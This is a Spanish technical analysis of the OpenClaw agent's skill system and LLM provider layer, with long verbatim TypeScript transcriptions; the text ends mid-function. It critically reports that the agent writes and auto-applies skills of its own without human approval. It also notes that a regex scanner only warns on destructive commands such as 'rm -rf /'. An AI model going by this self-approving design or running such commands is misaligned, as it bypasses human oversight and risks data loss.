# OpenClaw — Sistema de Skills (incl. auto-autoría) y Abstracción de Proveedores LLM

**Documento de referencia autosuficiente**
Fecha de análisis: 2026-08-01
Repo analizado: `openclaw-main` (TypeScript/Node, monorepo pnpm, ~24k archivos `.ts`) — *material de referencia que se conserva por ahora, pero que eventualmente se retirará del proyecto.*
Objetivo: entender los mecanismos reales, con el código transcrito literalmente, para poder reimplementar los patrones útiles en O.R.I.O.N. (Python) sin volver a mirar el original. Por eso el documento se escribe como **autosuficiente**: el código va transcrito dentro, no referenciado.

> **Convención de este documento**
> - Todo el código está **transcrito literalmente** del repo original. La ruta original se cita como referencia histórica, no como sustituto del contenido.
> - Se distingue explícitamente entre **[VERIFICADO EN CÓDIGO]** y **[AFIRMACIÓN DE DOCUMENTACIÓN]**.
> - Los hallazgos negativos ("busqué X y no existe") están marcados como tales.
> - Prosa en español; identificadores, rutas, tipos y fragmentos de código en su idioma original.

**Documento hermano**: `01-seguridad-y-aislamiento.md` (mismo repo, subsistema de seguridad/sandboxing).

---

## 0. Corrección de una premisa de partida

El encargo de este análisis traía una pista: *"`src/skills/workshop/` NO existe, lo que sí existe es `src/skills/research/` con un `autocapture.ts`"*.

**[VERIFICADO EN CÓDIGO — hallazgo correctivo] La pista es incorrecta en su mitad negativa.** Ambas carpetas existen y son **dos mitades del mismo mecanismo**:

- `src/skills/research/` — 6 archivos. Es la **capa de detección de señales**: observa la sesión y decide *cuándo* vale la pena proponer algo.
- `src/skills/workshop/` — 60 archivos. Es la **maquinaria de gobernanza**: propuestas, revisión, política de auto-aplicación, store SQLite con rollback, hooks de plugin, estándares de autoría.

Analizar solo `research/` habría dado una visión seriamente parcial: la respuesta a *"¿auto-aplica o pide aprobación?"* vive casi enteramente en `workshop/policy.ts`, `workshop/auto-apply.ts` y `research/autocapture-auto-apply.test.ts`.

*(Sección en construcción — el resto del documento se completa incrementalmente.)*

---

## 1. Resumen ejecutivo

### 1.1 Los dos subsistemas en una página

**SISTEMA DE SKILLS.** Un skill de OpenClaw es un **directorio con un `SKILL.md`**: frontmatter
YAML (metadatos de runtime) más cuerpo Markdown (material de prompt). El frontmatter tiene **dos
niveles**: el plano, que sigue el estándar *Agent Skills* de Anthropic (`name`, `description`,
`user-invocable`, `disable-model-invocation`), y un manifiesto JSON5 anidado bajo
`metadata.openclaw` con lo propio de OpenClaw (`requires`, `install`, `command`, `version`).
De hecho **el único campo verdaderamente obligatorio es `description`**: `name` cae por defecto al
nombre del directorio.

El enrutado es **perezoso y dirigido por el modelo**: al prompt solo van `name`, `description`,
`location` y `version` de cada skill elegible, dentro de un bloque `<available_skills>`; si el
modelo juzga que uno aplica, usa la herramienta `read` para cargar el cuerpo. Los skills se
descubren desde **seis fuentes con precedencia** (`extra < bundled < managed <
agents-skills-personal < agents-skills-project < workspace`) fundidas en un `Map` donde gana el
último. La **elegibilidad** (`requires.bins` / `anyBins` / `env` / `config`, más `os` y `always`)
filtra en silencio: un skill que no puede operar simplemente no aparece.

**AUTO-AUTORÍA.** OpenClaw detecta "instrucciones durables" en los mensajes del usuario mediante
**17 expresiones regulares**, genera un skill con una **plantilla determinista sin LLM**, y —este
es el hallazgo central— **lo aplica automáticamente, escribiéndolo en disco, sin aprobación
humana**, porque el default es `autonomous: { mode: "auto" }`. No hay umbral de repetición: **un
solo mensaje basta**. La única barrera real es un escáner de seguridad por regex que pone el skill
en cuarentena solo ante hallazgos `critical` (los `warn`, incluidos `rm -rf /` y `chmod 777`, no
bloquean).

**PROVEEDORES LLM.** La decisión de diseño central es que el registro se indexa por **protocolo de
API, no por vendor**: `createApiRegistry()` mantiene un `Map<Api, {stream, streamSimple}>` con
**9 protocolos conocidos** que dan servicio a **~35 vendors**. Añadir un vendor compatible con
OpenAI no requiere escribir código, solo una fila de catálogo. Ortogonal al registro está el
**catálogo de modelos**, datos puros con capacidades, coste, estado de ciclo de vida y una matriz
`compat` de **31 flags** de peculiaridades por modelo. Y una tercera capa independiente resuelve la
autenticación (variables de entorno, OAuth, credenciales ambientales).

**FAILOVER.** Existe, y es un subsistema grande (**172 archivos**, ~3.700 líneas en sus módulos
núcleo) — pero **no vive en la capa de proveedor**, que es deliberadamente tonta, sino en el
*runner* del agente. Clasifica los fallos en **16 razones cerradas** y escala en cuatro peldaños:
reintentar → **rotar credencial** → cambiar de modelo → rendirse. Su límite: la cadena de
alternativas es una lista que el usuario escribe a mano y que **está vacía por defecto**.

---

### 1.2 Los seis hallazgos que importan

1. **La premisa de partida era falsa, dos veces.** Se dijo que `src/skills/workshop/` no existía:
   existe, con **60 archivos**, y es la mitad de gobernanza del mecanismo (sección 0). Se dijo que
   el failover automático no estaba en el código: está, y es enorme (sección 6.0). Ambas se
   verificaron antes de aceptarlas.

2. **OpenClaw auto-aplica skills que él mismo escribe, sin preguntar** (sección 4). Y lo justifica
   con un comentario en `signals.ts` que dice *"a capture only creates a pending proposal a human
   must apply"* — **afirmación que el propio test `"auto-applies deterministic capture by default"`
   desmiente**. Una barandilla que solo existe en un comentario obsoleto.

3. **El failover es automático en ejecución pero manual en configuración** (sección 6.3). Toda la
   maquinaria depende de `agents.defaults.model.fallbacks`, que no tiene ningún valor por defecto.
   La información para derivarla existe (`getAvailable()`, `hasConfiguredAuth()`), pero no se usa.

4. **Indexar por protocolo en vez de por vendor es el patrón de mayor retorno del documento**
   (sección 5.1). Es exactamente lo contrario de lo que hace hoy `ai/llm_provider.py`, y aplicarlo
   colapsa `_ask_openai` + `_ask_deepseek` + `_ask_ollama` en **un solo adaptador**.

5. **La calibración de autonomía de OpenClaw es inconsistente** (sección 7.8): se atreve a escribir
   su propio código sin permiso, pero no a cambiar de proveedor LLM sin que el usuario lo liste.

6. **O.R.I.O.N. ya está por delante en gobernanza.** El gate central de REQ-005 y el pipeline de
   agentes no tienen equivalente en OpenClaw, cuyo `approvalPolicy` es `"auto"` y cuyo camino de
   autocaptura además lo puentea. Esto no es una carencia a llenar: es **la base del diferenciador
   de REQ-013** (sección 9.2).

---

### 1.3 Qué se lleva O.R.I.O.N.

Tres arreglos triviales de bugs verificados (`try` alrededor de `exec_module`, no cachear
respuestas de error, avisar de colisiones de intent), un enum de razones de fallo que evita hacer
fallback ante bugs propios, la declaración de requisitos de runtime con motivo explicable, y el
refactor del proveedor a registro por protocolo más catálogo como dato. El detalle priorizado está
en la tabla de **8.7**.

Y una decisión de identidad: **donde OpenClaw escribe un archivo, O.R.I.O.N. abre un REQ**
(sección 9.2).

---

### 1.4 Qué NO se lleva

Todo lo que resuelve problemas que O.R.I.O.N. no tiene: seis fuentes de skills con precedencia,
lectura anti-symlink, store SQLite con rollback (git ya lo hace), locks y colas por workspace,
rotación de perfiles de credencial, 31 flags de compatibilidad, clasificación de errores por regex
multi-idioma, y las dos características de frontmatter (`command-dispatch`, `always`) que **ningún
skill real usa** (sección 7.7).

Y sobre todo: **no se lleva `mode: "auto"`**.

---

## 2. Esquema de frontmatter — transcripción completa

Una skill de OpenClaw es **un directorio con un archivo `SKILL.md` dentro**. Nada más. El `SKILL.md` tiene frontmatter YAML y cuerpo Markdown. El cuerpo es prompt para el modelo; el frontmatter es metadata para el runtime.

### 2.1. Estructura de dos niveles

El frontmatter tiene una peculiaridad de diseño importante: **es plano en el nivel exterior, pero anida un bloque JSON5 en el campo `metadata`**.

```
---
name: …                 ← nivel plano (string)
description: …          ← nivel plano (string)
user-invocable: …       ← nivel plano (string→bool)
command-dispatch: …     ← nivel plano
metadata:               ← contenedor del manifiesto
  { "openclaw": {       ← ⟵ bloque JSON5 anidado
      emoji, os, requires, install, always, skillKey, primaryEnv, homepage
  } }
---
```

La razón es de compatibilidad: el nivel plano es el estándar de *Agent Skills* de Anthropic (`name`, `description`, `user-invocable`, `disable-model-invocation`), y OpenClaw mete todo lo suyo dentro de `metadata.openclaw` para no colisionar con ese estándar ni con otros consumidores del mismo archivo.

**[VERIFICADO EN CÓDIGO]** El parser plano es YAML puro y **colapsa todo a strings**:

```ts
type ParsedFrontmatter = Record<string, string>;
// …
export type ParsedSkillFrontmatter = Record<string, string>;
```

Los objetos y arrays se serializan a JSON (`JSON.stringify`) y quedan guardados como string; por eso el bloque `metadata` se vuelve a parsear después con JSON5. `packages/markdown-core/src/frontmatter.ts`:

```ts
function coerceYamlFrontmatterValue(value: unknown): ParsedYamlValue | undefined {
  if (value === null || value === undefined) {
    return undefined;
  }
  if (typeof value === "string") {
    return { value: value.trim(), kind: "scalar" };
  }
  if (typeof value === "number" || typeof value === "boolean") {
    return { value: String(value), kind: "scalar" };
  }
  if (typeof value === "object") {
    try {
      return { value: JSON.stringify(value), kind: "structured" };
    } catch {
      return undefined;
    }
  }
  return undefined;
}
```

### 2.2. Campos obligatorios: exactamente dos

**[VERIFICADO EN CÓDIGO]** — `src/skills/loading/local-loader.ts`, función `loadSingleSkillDirectory()`:

```ts
  const fallbackName = path.basename(params.skillDir).trim();
  const name = frontmatter.name?.trim() || fallbackName;
  const description = frontmatter.description?.trim();
  if (!name || !description) {
    return null;
  }
```

Dos observaciones no obvias:

1. **`name` tiene fallback al nombre del directorio.** Si el frontmatter no declara `name`, se usa `path.basename(skillDir)`. Es decir, en la práctica **el único campo verdaderamente obligatorio es `description`**.
2. **Si falta `description`, la skill se descarta en silencio** — `return null`, sin diagnóstico. Esto contrasta con el fallo de parseo de frontmatter, que sí emite diagnóstico. Es una asimetría notable y está listada como debilidad en la sección 7.

La documentación (`docs/tools/creating-skills.md`) declara ambos como obligatorios:

| Field | Description |
|---|---|
| `name` | Unique slug using lowercase letters, digits, and hyphens |
| `description` | One-line description shown to the agent and in discovery output |

**[AFIRMACIÓN DE DOCUMENTACIÓN parcialmente no respaldada]**: el código no valida que `name` sea un slug en minúsculas con guiones. La normalización (`sanitizeSkillCommandName`, `normalizeSkillIndexName`) ocurre más tarde y en otros contextos (nombres de comando slash, índice), no como validación de carga.

### 2.3. Campos del nivel plano

| Campo | Tipo | Default | Leído en | Qué hace |
|---|---|---|---|---|
| `name` | string | basename del dir | `local-loader.ts` | Identidad de la skill |
| `description` | string | — **(requerido)** | `local-loader.ts` | Se inyecta en el prompt `<available_skills>` |
| `user-invocable` | bool | `true` | `frontmatter.ts` | Expone la skill como comando slash |
| `disable-model-invocation` | bool | `false` | `frontmatter.ts` | Saca la skill del system prompt del agente |
| `homepage` | string | — | *(en `metadata.openclaw`)* | URL mostrada en la UI de macOS |
| `command-dispatch` | `"tool"` | — | `command-specs.ts` | Rutea el slash command directo a una tool |
| `command-tool` | string | — | `command-specs.ts` | Nombre de la tool a invocar |
| `command-arg-mode` | `"raw"` | `"raw"` | `command-specs.ts` | Cómo pasar los args a la tool |

**Transcripción literal** del parser de política de invocación, `src/skills/loading/frontmatter.ts`:

```ts
export function resolveSkillInvocationPolicy(
  frontmatter: ParsedSkillFrontmatter,
): SkillInvocationPolicy {
  return {
    userInvocable: parseFrontmatterBool(getFrontmatterString(frontmatter, "user-invocable"), true),
    disableModelInvocation: parseFrontmatterBool(
      getFrontmatterString(frontmatter, "disable-model-invocation"),
      false,
    ),
  };
}
```

Con el tipo:

```ts
export type SkillInvocationPolicy = {
  userInvocable: boolean;
  disableModelInvocation: boolean;
};
```

Nótese que ambos ejes son independientes: una skill puede ser invocable por el usuario pero invisible para el modelo (`disable-model-invocation: true`), o viceversa.

### 2.4. Tool-dispatch (opcional)

**[VERIFICADO EN CÓDIGO]** Permite que un comando slash de skill **no pase por el modelo** y vaya derecho a una herramienta. El parseo vive en `src/skills/discovery/command-specs.ts`, no en `frontmatter.ts`:

```ts
    const dispatch = entry.disableCommandDispatch
      ? undefined
      : (() => {
          const kindRaw = normalizeLowercaseStringOrEmpty(
            entry.frontmatter?.["command-dispatch"] ??
              entry.frontmatter?.["command_dispatch"] ??
              "",
          );
          if (!kindRaw || kindRaw !== "tool") {
            return undefined;
          }

          const toolName = (
            entry.frontmatter?.["command-tool"] ??
            entry.frontmatter?.["command_tool"] ??
            ""
          ).trim();
          if (!toolName) {
            debugSkillCommandOnce(
              `dispatch:missingTool:${rawName}`,
              `Skill command "/${unique}" requested tool dispatch but did not provide command-tool. Ignoring dispatch.`,
              { skillName: rawName, command: unique },
            );
            return undefined;
          }

          const argModeRaw = normalizeOptionalLowercaseString(
            entry.frontmatter?.["command-arg-mode"] ??
              entry.frontmatter?.["command_arg_mode"] ??
              "",
          );
          const argMode = !argModeRaw || argModeRaw === "raw" ? "raw" : null;
          if (!argMode) {
            debugSkillCommandOnce(
              `dispatch:badArgMode:${rawName}:${argModeRaw}`,
              `Skill command "/${unique}" requested tool dispatch but has unknown command-arg-mode. Falling back to raw.`,
              { skillName: rawName, command: unique, argMode: argModeRaw },
            );
          }

          return { kind: "tool", toolName, argMode: "raw" } as const;
        })();
```

Con el tipo (`src/skills/types.ts`):

```ts
type SkillCommandDispatchSpec = {
  kind: "tool";
  /** Name of the tool to invoke (AnyAgentTool.name). */
  toolName: string;
  /**
   * How to forward user-provided args to the tool.
   * - raw: forward the raw args string (no core parsing).
   */
  argMode?: "raw";
};
```

Comportamiento ante error, verificado:

- `command-dispatch` con valor distinto de `"tool"` → se ignora el dispatch, silenciosamente.
- `command-dispatch: tool` **sin** `command-tool` → se ignora el dispatch, con un log de debug. La skill sigue funcionando por la vía normal (a través del modelo).
- `command-arg-mode` desconocido → **no falla**, cae a `"raw"` con log de debug.

En todos los casos la degradación es blanda: **nunca se rechaza la skill por un dispatch mal declarado**.

El dispatch pasa además por el pipeline completo de políticas de herramientas antes de ejecutar — `src/skills/runtime/tool-dispatch.ts` lo declara explícitamente:

```ts
/**
 * Policy-enforcement seam for skill `command-dispatch: tool` invocations.
 * Keep this aligned with normal tool surfaces across sender, group, sandbox,
 * and subagent policy layers.
 */
export function resolveSkillDispatchTools(params: { … }): AnyAgentTool[]
```

> **[HALLAZGO NEGATIVO]** Busqué `command-dispatch` en las 53 skills del directorio `skills/` de la raíz: **ninguna lo usa**. Solo aparece en `docs/` y en dos archivos de test (`src/skills/loading/skills.test.ts`, `src/skills/runtime/remote-skills.test.ts`). Es una capacidad implementada y testeada pero sin ningún consumidor real en el repo.

### 2.5. El bloque `metadata.openclaw` — manifiesto completo

**Transcripción literal** del tipo, `src/skills/types.ts`:

```ts
export type OpenClawSkillMetadata = {
  always?: boolean;
  skillKey?: string;
  primaryEnv?: string;
  emoji?: string;
  homepage?: string;
  os?: string[];
  requires?: {
    bins?: string[];
    anyBins?: string[];
    env?: string[];
    config?: string[];
  };
  install?: SkillInstallSpec[];
};
```

Y su parser, `src/skills/loading/frontmatter.ts`:

```ts
export function resolveOpenClawMetadata(
  frontmatter: ParsedSkillFrontmatter,
): OpenClawSkillMetadata | undefined {
  const metadataObj = resolveOpenClawManifestBlock({ frontmatter });
  if (!metadataObj) {
    return undefined;
  }
  const requires = resolveOpenClawManifestRequires(metadataObj);
  const install = resolveOpenClawManifestInstall(metadataObj, parseInstallSpec);
  const osRaw = resolveOpenClawManifestOs(metadataObj);
  return {
    always: typeof metadataObj.always === "boolean" ? metadataObj.always : undefined,
    emoji: readStringValue(metadataObj.emoji),
    homepage: readStringValue(metadataObj.homepage),
    skillKey: readStringValue(metadataObj.skillKey),
    primaryEnv: readStringValue(metadataObj.primaryEnv),
    os: osRaw.length > 0 ? osRaw : undefined,
    requires,
    install: install.length > 0 ? install : undefined,
  };
}
```

El bloque se localiza con tolerancia a nombres heredados (`src/shared/frontmatter.ts`):

```ts
/** Parses the JSON5 OpenClaw manifest block embedded inside a string frontmatter field. */
export function resolveOpenClawManifestBlock(params: {
  frontmatter: Record<string, unknown>;
  key?: string;
}): Record<string, unknown> | undefined {
  const raw = getFrontmatterString(params.frontmatter, params.key ?? "metadata");
  if (!raw) {
    return undefined;
  }

  try {
    const parsed = JSON5.parse(raw);
    if (!parsed || typeof parsed !== "object") {
      return undefined;
    }

    const manifestKeys = [MANIFEST_KEY, ...LEGACY_MANIFEST_KEYS];
    // Prefer the current manifest key, but still read legacy names for existing skill/hook files.
    for (const key of manifestKeys) {
      const candidate = (parsed as Record<string, unknown>)[key];
      if (candidate && typeof candidate === "object") {
        return candidate as Record<string, unknown>;
      }
    }
    return undefined;
  } catch {
    return undefined;
  }
}
```

Con las constantes de `src/compat/legacy-names.ts`:

```ts
const PROJECT_NAME = "openclaw" as const;
const LEGACY_PROJECT_NAMES = ["clawdbot"] as const;
export const MANIFEST_KEY = PROJECT_NAME;
/** Manifest keys accepted only for legacy compatibility. */
export const LEGACY_MANIFEST_KEYS = LEGACY_PROJECT_NAMES;
```

**Campo por campo:**

| Campo | Tipo | Qué hace | Notas de validación |
|---|---|---|---|
| `always` | bool | **Bypass total del chequeo de `requires`.** Si es `true`, la skill se carga aunque falten binarios/env/config. El gate de `os` **sigue aplicando**. | Solo se acepta un booleano real; cualquier otro valor → `undefined` |
| `skillKey` | string | Clave de configuración, puede diferir del `name` visible al modelo | Permite renombrar la skill sin romper la config del usuario |
| `primaryEnv` | string | Nombre de la variable de entorno "principal". Habilita que un `apiKey` configurado en `skills.entries.<key>.apiKey` satisfaga ese `requires.env` | Ver 2.7 |
| `emoji` | string | Icono en la UI | Puramente cosmético |
| `homepage` | string | URL "Website" en la UI de macOS | Cosmético |
| `os` | string[] | Allowlist de plataformas (`process.platform`: `darwin`, `linux`, `win32`) | Evaluado **antes** que `always` |
| `requires` | objeto | Gating por capacidades — ver 2.6 | |
| `install` | array | Recetas de instalación de dependencias — ver 2.7 | Specs inválidas se **descartan silenciosamente**, no invalidan la skill |

### 2.6. El spec de `requires`

**Transcripción literal**, `src/shared/frontmatter.ts`:

```ts
type OpenClawManifestRequires = {
  /** All binaries that must be available. */
  bins: string[];
  /** Alternative binaries where any one match is enough. */
  anyBins: string[];
  /** Environment variables required by the entry. */
  env: string[];
  /** Config paths required by the entry. */
  config: string[];
};

/** Extracts normalized runtime requirement lists from an OpenClaw manifest block. */
export function resolveOpenClawManifestRequires(
  metadataObj: Record<string, unknown>,
): OpenClawManifestRequires | undefined {
  const requiresRaw =
    typeof metadataObj.requires === "object" && metadataObj.requires !== null
      ? (metadataObj.requires as Record<string, unknown>)
      : undefined;
  if (!requiresRaw) {
    return undefined;
  }
  return {
    bins: normalizeStringList(requiresRaw.bins),
    anyBins: normalizeStringList(requiresRaw.anyBins),
    env: normalizeStringList(requiresRaw.env),
    config: normalizeStringList(requiresRaw.config),
  };
}
```

Las cuatro clases de requisito:

| Clave | Semántica | Cómo se resuelve |
|---|---|---|
| `bins` | **Todos** los binarios deben existir (AND) | `hasBinary()` recorre `PATH` con `X_OK`; en Windows también prueba `PATHEXT` |
| `anyBins` | **Al menos uno** debe existir (OR) | Útil para alternativas equivalentes (`node` o `bun`) |
| `env` | **Todas** las variables deben estar definidas y no vacías | Ver la triple fuente en 2.7 |
| `config` | **Todos** los paths de config deben ser truthy | Path punteado (`browser.enabled`) resuelto contra la config, con protección anti prototype-pollution |

`bins` y `anyBins` admiten además satisfacción **remota**: si el binario no está en la máquina local pero sí en un *node* conectado, cuenta como satisfecho (`hasRemoteBin` / `hasAnyRemoteBin`).

### 2.7. Qué pasa si un skill declara una dependencia no satisfecha

**Respuesta corta: la skill no se rompe ni emite error — simplemente se vuelve invisible.** Se filtra de la lista de skills elegibles, no entra al prompt `<available_skills>` y no se registra como comando. Es un **gating silencioso**, no una validación con fallo.

**Transcripción literal** del evaluador completo, `src/shared/config-eval.ts`:

```ts
type RuntimeRequires = {
  bins?: string[];
  anyBins?: string[];
  env?: string[];
  config?: string[];
};

type RuntimeRequirementEvalParams = {
  requires?: RuntimeRequires;
  hasBin: (bin: string) => boolean;
  hasAnyRemoteBin?: (bins: string[]) => boolean;
  hasRemoteBin?: (bin: string) => boolean;
  hasEnv: (envName: string) => boolean;
  isConfigPathTruthy: (pathStr: string) => boolean;
};

/** Evaluates binary/env/config requirements against local and optional remote capabilities. */
function evaluateRuntimeRequires(params: RuntimeRequirementEvalParams): boolean {
  const requires = params.requires;
  if (!requires) {
    return true;
  }

  const requiredBins = requires.bins ?? [];
  if (requiredBins.length > 0) {
    for (const bin of requiredBins) {
      if (params.hasBin(bin)) {
        continue;
      }
      if (params.hasRemoteBin?.(bin)) {
        continue;
      }
      return false;
    }
  }

  const requiredAnyBins = requires.anyBins ?? [];
  if (requiredAnyBins.length > 0) {
    const anyFound = requiredAnyBins.some((bin) => params.hasBin(bin));
    if (!anyFound && !params.hasAnyRemoteBin?.(requiredAnyBins)) {
      return false;
    }
  }

  const requiredEnv = requires.env ?? [];
  if (requiredEnv.length > 0) {
    for (const envName of requiredEnv) {
      if (!params.hasEnv(envName)) {
        return false;
      }
    }
  }

  const requiredConfig = requires.config ?? [];
  if (requiredConfig.length > 0) {
    for (const configPath of requiredConfig) {
      if (!params.isConfigPathTruthy(configPath)) {
        return false;
      }
    }
  }

  return true;
}

/** Evaluates OS gating and runtime requirements for skill/plugin entry eligibility. */
export function evaluateRuntimeEligibility(
  params: {
    os?: string[];
    remotePlatforms?: string[];
    always?: boolean;
  } & RuntimeRequirementEvalParams,
): boolean {
  const osList = params.os ?? [];
  const remotePlatforms = params.remotePlatforms ?? [];
  if (
    osList.length > 0 &&
    !osList.includes(resolveRuntimePlatform()) &&
    !remotePlatforms.some((platform) => osList.includes(platform))
  ) {
    return false;
  }
  if (params.always === true) {
    return true;
  }
  return evaluateRuntimeRequires({
    requires: params.requires,
    hasBin: params.hasBin,
    hasRemoteBin: params.hasRemoteBin,
    hasAnyRemoteBin: params.hasAnyRemoteBin,
    hasEnv: params.hasEnv,
    isConfigPathTruthy: params.isConfigPathTruthy,
  });
}
```

**El orden de evaluación es significativo** y vale la pena subrayarlo:

1. **`os` primero.** Si la plataforma no está en la lista, se descarta — **incluso si `always: true`**. El sistema operativo es un gate duro que nada saltea.
2. **`always: true` después.** Si está, retorna `true` y **se saltea todo el chequeo de `requires`**.
3. **`requires` al final**, en orden `bins` → `anyBins` → `env` → `config`, con cortocircuito al primer fallo.

Y la detección de binarios, con su caché invalidado por cambios en `PATH`:

```ts
/** Checks PATH for an executable binary, including PATHEXT candidates on Windows. */
export function hasBinary(bin: string): boolean {
  const pathEnv = process.env.PATH ?? "";
  const pathExt = process.platform === "win32" ? (process.env.PATHEXT ?? "") : "";
  if (cachedHasBinaryPath !== pathEnv || cachedHasBinaryPathExt !== pathExt) {
    // PATH/PATHEXT changes invalidate all cached binary probes; keeping stale misses
    // would make newly installed tools invisible until process restart.
    cachedHasBinaryPath = pathEnv;
    cachedHasBinaryPathExt = pathExt;
    hasBinaryCache.clear();
  }
  if (hasBinaryCache.has(bin)) {
    return hasBinaryCache.get(bin)!;
  }

  const parts = pathEnv.split(path.delimiter).filter(Boolean);
  const extensions = process.platform === "win32" ? windowsPathExtensions() : [""];
  for (const part of parts) {
    for (const ext of extensions) {
      const candidate = path.join(part, bin + ext);
      try {
        fs.accessSync(candidate, fs.constants.X_OK);
        hasBinaryCache.set(bin, true);
        return true;
      } catch {
        // keep scanning
      }
    }
  }
  hasBinaryCache.set(bin, false);
  return false;
}
```

La resolución de `env` tiene **tres fuentes**, en orden — este es un detalle de diseño muy transferible (`src/skills/loading/config.ts`):

```ts
export function isSkillEnvRequirementSatisfied(params: {
  envName: string;
  skillConfig?: SkillConfig;
  primaryEnv?: string;
}): boolean {
  const { envName, skillConfig, primaryEnv } = params;
  return (
    normalizeOptionalString(process.env[envName]) !== undefined ||
    normalizeOptionalString(skillConfig?.env?.[envName]) !== undefined ||
    (primaryEnv === envName && hasConfiguredSecretInput(skillConfig?.apiKey))
  );
}
```

Es decir: (1) variable de entorno del proceso, (2) `env` declarado en la config de esa skill, (3) si la variable es la `primaryEnv` de la skill, alcanza con que haya un `apiKey` configurado. La tercera opción es la que hace que el usuario no tenga que saber cómo se llama la variable interna.

Y el filtro de inclusión completo, con sus gates adicionales:

```ts
export function shouldIncludeSkill(params: {
  entry: SkillEntry;
  config?: OpenClawConfig;
  bundledAllowlist: ReadonlySet<string> | undefined;
  eligibility?: SkillEligibilityContext;
}): boolean {
  const { entry, config, bundledAllowlist, eligibility } = params;
  const skillKey = resolveSkillKey(entry.skill, entry);
  const skillConfig = resolveSkillConfig(config, skillKey);

  if (skillConfig?.enabled === false) {
    return false;
  }
  if (isSkillSecretOwnerUnavailable(skillKey)) {
    return false;
  }
  if (!isBundledSkillAllowed(entry, bundledAllowlist)) {
    return false;
  }
  return evaluateRuntimeEligibility({
    os: entry.metadata?.os,
    remotePlatforms: eligibility?.remote?.platforms,
    always: entry.metadata?.always,
    requires: entry.metadata?.requires,
    hasBin: hasBinary,
    hasRemoteBin: eligibility?.remote?.hasBin,
    hasAnyRemoteBin: eligibility?.remote?.hasAnyBin,
    hasEnv: (envName) =>
      isSkillEnvRequirementSatisfied({
        envName,
        skillConfig,
        primaryEnv: entry.metadata?.primaryEnv,
      }),
    isConfigPathTruthy: (configPath) => isSkillConfigPathTruthy(config, configPath),
  });
}
```

Los tres gates previos a la elegibilidad de runtime: **apagado explícito** por config, **secreto degradado** (si el arranque en frío aisló el secreto de esa skill, la skill no carga), y **allowlist de skills bundled**.

### 2.8. El spec de `install`

Declara **cómo instalar** las dependencias que `requires` verifica. Es descriptivo: el runtime no instala solo al arrancar, sino que ofrece la receta a un flujo de instalación explícito.

**Transcripción literal** del tipo, `src/skills/types.ts`:

```ts
export type SkillInstallSpec = {
  id?: string;
  kind: "brew" | "node" | "go" | "uv" | "download";
  label?: string;
  bins?: string[];
  os?: string[];
  formula?: string;
  package?: string;
  module?: string;
  url?: string;
  archive?: string;
  extract?: boolean;
  stripComponents?: number;
  targetDir?: string;
};
```

Cinco `kind` soportados, cada uno con su campo obligatorio propio:

| `kind` | Campo requerido | Validación aplicada |
|---|---|---|
| `brew` | `formula` (o `cask`, que se copia a `formula`) | `BREW_FORMULA_PATTERN` |
| `node` | `package` | `validateRegistryNpmSpec()` |
| `go` | `module` | `GO_MODULE_PATTERN` |
| `uv` | `package` | `UV_PACKAGE_PATTERN` |
| `download` | `url` | debe parsear como URL `http:`/`https:` |

**Transcripción literal del parser completo con toda su validación**, `src/skills/loading/frontmatter.ts`:

```ts
const BREW_FORMULA_PATTERN = /^[A-Za-z0-9][A-Za-z0-9@+._/-]*$/;
const GO_MODULE_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._~+\-/]*(?:@[A-Za-z0-9][A-Za-z0-9._~+\-/]*)?$/;
const UV_PACKAGE_PATTERN = /^[A-Za-z0-9][A-Za-z0-9._\-[\]=<>!~+,]*$/;

function normalizeSafeBrewFormula(raw: unknown): string | undefined {
  if (typeof raw !== "string") {
    return undefined;
  }
  const formula = raw.trim();
  if (!formula || formula.startsWith("-") || formula.includes("\\") || formula.includes("..")) {
    return undefined;
  }
  if (!BREW_FORMULA_PATTERN.test(formula)) {
    return undefined;
  }
  return formula;
}

function normalizeSafeNpmSpec(raw: unknown): string | undefined {
  if (typeof raw !== "string") {
    return undefined;
  }
  const spec = raw.trim();
  if (!spec || spec.startsWith("-")) {
    return undefined;
  }
  if (validateRegistryNpmSpec(spec) !== null) {
    return undefined;
  }
  return spec;
}

function normalizeSafeGoModule(raw: unknown): string | undefined {
  if (typeof raw !== "string") {
    return undefined;
  }
  const moduleSpec = raw.trim();
  if (
    !moduleSpec ||
    moduleSpec.startsWith("-") ||
    moduleSpec.includes("\\") ||
    moduleSpec.includes("://")
  ) {
    return undefined;
  }
  if (!GO_MODULE_PATTERN.test(moduleSpec)) {
    return undefined;
  }
  return moduleSpec;
}

function normalizeSafeUvPackage(raw: unknown): string | undefined {
  if (typeof raw !== "string") {
    return undefined;
  }
  const pkg = raw.trim();
  if (!pkg || pkg.startsWith("-") || pkg.includes("\\") || pkg.includes("://")) {
    return undefined;
  }
  if (!UV_PACKAGE_PATTERN.test(pkg)) {
    return undefined;
  }
  return pkg;
}

function normalizeSafeDownloadUrl(raw: unknown): string | undefined {
  if (typeof raw !== "string") {
    return undefined;
  }
  const value = raw.trim();
  if (!value || /\s/.test(value)) {
    return undefined;
  }
  try {
    const parsed = new URL(value);
    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") {
      return undefined;
    }
    return parsed.toString();
  } catch {
    return undefined;
  }
}

function parseInstallSpec(input: unknown): SkillInstallSpec | undefined {
  const parsed = parseOpenClawManifestInstallBase(input, ["brew", "node", "go", "uv", "download"]);
  if (!parsed) {
    return undefined;
  }
  const { raw } = parsed;
  const spec = applyOpenClawManifestInstallCommonFields<SkillInstallSpec>(
    {
      kind: parsed.kind as SkillInstallSpec["kind"],
    },
    parsed,
  );
  const osList = normalizeStringList(raw.os);
  if (osList.length > 0) {
    spec.os = osList;
  }
  const formula = normalizeSafeBrewFormula(raw.formula);
  if (formula) {
    spec.formula = formula;
  }
  const cask = normalizeSafeBrewFormula(raw.cask);
  if (!spec.formula && cask) {
    spec.formula = cask;
  }
  if (spec.kind === "node") {
    const pkg = normalizeSafeNpmSpec(raw.package);
    if (pkg) {
      spec.package = pkg;
    }
  } else if (spec.kind === "uv") {
    const pkg = normalizeSafeUvPackage(raw.package);
    if (pkg) {
      spec.package = pkg;
    }
  }
  const moduleSpec = normalizeSafeGoModule(raw.module);
  if (moduleSpec) {
    spec.module = moduleSpec;
  }
  const downloadUrl = normalizeSafeDownloadUrl(raw.url);
  if (downloadUrl) {
    spec.url = downloadUrl;
  }
  if (typeof raw.archive === "string") {
    spec.archive = raw.archive;
  }
  if (typeof raw.extract === "boolean") {
    spec.extract = raw.extract;
  }
  if (typeof raw.stripComponents === "number") {
    spec.stripComponents = raw.stripComponents;
  }
  if (typeof raw.targetDir === "string") {
    spec.targetDir = raw.targetDir;
  }

  if (spec.kind === "brew" && !spec.formula) {
    return undefined;
  }
  if (spec.kind === "node" && !spec.package) {
    return undefined;
